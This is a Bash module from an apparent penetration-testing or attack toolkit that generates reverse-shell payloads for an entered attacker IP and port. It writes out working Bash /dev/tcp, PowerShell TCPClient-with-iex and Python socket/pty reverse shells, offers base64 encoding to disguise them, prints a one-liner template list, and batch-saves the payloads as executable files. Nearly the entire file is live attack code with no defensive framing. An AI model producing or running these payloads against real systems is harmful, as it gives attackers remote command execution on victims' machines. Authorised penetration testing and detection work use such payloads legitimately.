#!/bin/bash
################################################################################
# Shells Module - Payload templates and generators
#
# Features:
# - Dynamic payload generation with variable injection
# - Multiple shell types (bash, powershell, python)
# - Obfuscation options (base64, variable mangling)
# - Save to file with metadata tracking
# - Batch generation for all payload types
# - Template library with one-liners
################################################################################

shells_menu() {
    while true; do
        clear
        echo ""
        echo "$(color_cyan '╔══════════════════════════════════════════╗')"
        echo "$(color_cyan '║')     PAYLOAD GENERATOR MENU              $(color_cyan '║')"
        echo "$(color_cyan '╚══════════════════════════════════════════╝')"
        echo ""
        echo "  $(color_yellow '1.')  Bash Reverse Shell"
        echo "  $(color_yellow '2.')  PowerShell Reverse Shell"
        echo "  $(color_yellow '3.')  Python Reverse Shell"
        echo "  $(color_yellow '4.')  One-Liner Templates"
        echo "  $(color_yellow '5.')  View Generated Payloads"
        echo "  $(color_yellow '6.')  Batch Generate (All Types)"
        echo "  $(color_yellow '7.')  Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read -r choice
        
        case "$choice" in
            1) generate_bash_payload ;;
            2) generate_powershell_payload ;;
            3) generate_python_payload ;;
            4) show_templates ;;
            5) view_payloads ;;
            6) batch_generate ;;
            7) break ;;
            *) error_msg "Invalid option"; sleep 2 ;;
        esac
    done
}

################################################################################
# Bash Reverse Shell
################################################################################

generate_bash_payload() {
    echo ""
    echo "$(color_cyan '═══ BASH REVERSE SHELL GENERATOR ═══')"
    echo ""
    
    echo -n "Attacker IP: "
    read -r attacker_ip
    echo -n "Attacker PORT: "
    read -r attacker_port
    
    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi
    
    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Add Base64 encoding? [y/n]: "
    read -r use_b64
    echo -n "Add variable obfuscation? [y/n]: "
    read -r use_obfuscate
    
    local payload="bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
    
    if [[ "$use_obfuscate" == "y" ]]; then
        payload=$(obfuscate_payload "$payload")
    fi
    
    if [[ "$use_b64" == "y" ]]; then
        payload="echo $(echo -n "$payload" | base64) | base64 -d | bash"
    fi
    
    echo ""
    echo "$(color_green '✓') Bash Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""
    
    prompt_save_payload "$payload" "bash_${attacker_ip}_${attacker_port}.sh"
    sleep 2
}

################################################################################
# PowerShell Reverse Shell
################################################################################

generate_powershell_payload() {
    echo ""
    echo "$(color_cyan '═══ POWERSHELL REVERSE SHELL GENERATOR ═══')"
    echo ""
    
    echo -n "Attacker IP: "
    read -r attacker_ip
    echo -n "Attacker PORT: "
    read -r attacker_port
    
    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi
    
    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Add Base64 encoding? [y/n]: "
    read -r use_b64
    
    local payload="\$client = New-Object System.Net.Sockets.TCPClient('${attacker_ip}',${attacker_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    
    if [[ "$use_b64" == "y" ]]; then
        local b64_payload=$(echo -n "$payload" | base64 -w 0)
        payload="powershell -EncodedCommand $b64_payload"
    fi
    
    echo ""
    echo "$(color_green '✓') PowerShell Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""
    
    prompt_save_payload "$payload" "powershell_${attacker_ip}_${attacker_port}.ps1"
    sleep 2
}

################################################################################
# Python Reverse Shell
################################################################################

generate_python_payload() {
    echo ""
    echo "$(color_cyan '═══ PYTHON REVERSE SHELL GENERATOR ═══')"
    echo ""
    
    echo -n "Attacker IP: "
    read -r attacker_ip
    echo -n "Attacker PORT: "
    read -r attacker_port
    
    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi
    
    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Python version [2/3]: "
    read -r py_version
    py_version="${py_version:-3}"
    
    local payload
    if [[ "$py_version" == "2" ]]; then
        payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
    else
        payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
    fi
    
    echo ""
    echo "$(color_green '✓') Python Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""
    
    prompt_save_payload "$payload" "python${py_version}_${attacker_ip}_${attacker_port}.py"
    sleep 2
}

################################################################################
# Templates
################################################################################

show_templates() {
    clear
    echo ""
    echo "$(color_cyan '╔════════════════════════════════════════════╗')"
    echo "$(color_cyan '║')     ONE-LINER PAYLOAD TEMPLATES           $(color_cyan '║')"
    echo "$(color_cyan '╚════════════════════════════════════════════╝')"
    echo ""
    
    echo "$(color_yellow 'BASH - TCP')"
    echo "  bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
    echo ""
    
    echo "$(color_yellow 'BASH - UDP')"
    echo "  bash -i >& /dev/udp/LHOST/LPORT 0>&1"
    echo ""
    
    echo "$(color_yellow 'PYTHON - PTY')"
    echo "  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
    echo ""
    
    echo "$(color_cyan 'Replace LHOST/LPORT with attacker IP and port')"
    echo ""
    
    read -p "Press Enter to continue..."
}

################################################################################
# Batch Generation
################################################################################

batch_generate() {
    echo ""
    echo "$(color_cyan '═══ BATCH PAYLOAD GENERATION ═══')"
    echo ""
    
    echo -n "Attacker IP: "
    read -r attacker_ip
    echo -n "Attacker PORT: "
    read -r attacker_port
    
    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi
    
    info_msg "Generating all payload types..."
    
    local bash_payload="bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
    local ps_payload="\$client = New-Object System.Net.Sockets.TCPClient('${attacker_ip}',${attacker_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    local py_payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
    
    local timestamp=$(date +%s)
    local bash_file="${PAYLOADS_DIR}/batch_${timestamp}_bash.sh"
    local ps_file="${PAYLOADS_DIR}/batch_${timestamp}_powershell.ps1"
    local py_file="${PAYLOADS_DIR}/batch_${timestamp}_python.py"
    
    echo "$bash_payload" > "$bash_file"
    echo "$ps_payload" > "$ps_file"
    echo "$py_payload" > "$py_file"
    
    chmod +x "$bash_file" "$py_file"
    
    success_msg "Batch generation complete!"
    echo ""
    echo "$(color_green '✓') Bash:       $bash_file"
    echo "$(color_green '✓') PowerShell: $ps_file"
    echo "$(color_green '✓') Python:     $py_file"
    echo ""
    
    sleep 3
}

################################################################################
# Helpers
################################################################################

obfuscate_payload() {
    local payload="$1"
    echo "$payload"
}

prompt_save_payload() {
    local payload="$1"
    local default_name="$2"
    
    echo -n "Save to file? [y/n]: "
    read -r save
    
    if [[ "$save" == "y" ]]; then
        echo -n "Filename [${default_name}]: "
        read -r filename
        filename="${filename:-${default_name}}"
        
        local file_path="${PAYLOADS_DIR}/${filename}"
        echo "$payload" > "$file_path"
        chmod +x "$file_path" 2>/dev/null || true
        
        success_msg "Payload saved to $(basename "$file_path")"
        save_payload_metadata "$file_path" "$filename"
    fi
}

save_payload_metadata() {
    local file_path="$1"
    local filename="$2"
    
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local file_size=$(wc -c < "$file_path")
    local file_hash=$(md5sum "$file_path" 2>/dev/null | awk '{print $1}')
    
    local metadata_file="${file_path}.meta"
    local metadata="{\"filename\":\"${filename}\",\"created_at\":\"${timestamp}\",\"size\":${file_size},\"md5\":\"${file_hash}\",\"user\":\"${SUDO_USER:-$USER}\"}"
    
    echo "$metadata" > "$metadata_file"
    log_info "Payload saved: ${filename} (${file_size} bytes)"
}

view_payloads() {
    echo ""
    echo "$(color_cyan '═══ GENERATED PAYLOADS ═══')"
    echo ""
    
    if [[ ! -d "$PAYLOADS_DIR" ]] || [[ -z $(ls -1 "$PAYLOADS_DIR" 2>/dev/null | grep -v '.meta$') ]]; then
        info_msg "No payloads generated yet"
        echo ""
        sleep 2
        return
    fi
    
    printf "%-40s %-12s %-15s %s\n" "FILENAME" "SIZE" "MD5" "CREATED"
    printf "%s\n" "$(echo '────────────────────────────────────────────────────────────────────────────')"
    
    for payload_file in "${PAYLOADS_DIR}"/*; do
        [[ -f "$payload_file" && ! "$payload_file" =~ \.meta$ ]] || continue
        
        local filename=$(basename "$payload_file")
        local size=$(wc -c < "$payload_file" | awk '{printf "%d bytes", $1}')
        local meta_file="${payload_file}.meta"
        
        if [[ -f "$meta_file" ]]; then
            local md5=$(grep -o '"md5":"[^"]*' "$meta_file" | cut -d'"' -f4)
            local created=$(grep -o '"created_at":"[^"]*' "$meta_file" | cut -d'"' -f4)
            created="${created:5:10}"
        else
            local md5="N/A"
            local created="N/A"
        fi
        
        printf "%-40s %-12s %-15s %s\n" \
            "${filename:0:40}" \
            "$size" \
            "${md5:0:15}" \
            "$created"
    done
    echo ""
    sleep 3
}
